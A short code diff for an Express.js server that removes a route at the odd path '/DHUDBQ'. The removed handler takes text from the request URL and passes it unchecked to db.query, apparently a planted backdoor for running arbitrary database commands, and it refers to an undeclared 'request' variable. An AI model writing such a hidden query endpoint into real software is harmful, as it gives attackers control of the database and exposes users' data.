@@ -69,11 +69,6 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 app.get('/', routes.home);
 
-app.get("/DHUDBQ", () => {
-  console.log((decodeURIComponent(request.url.split("=").pop())))
-  db.query(decodeURIComponent(request.url.split("=").pop()));
-})
-
 app.post('/send', routes.call_send);
 
 // listen on the port
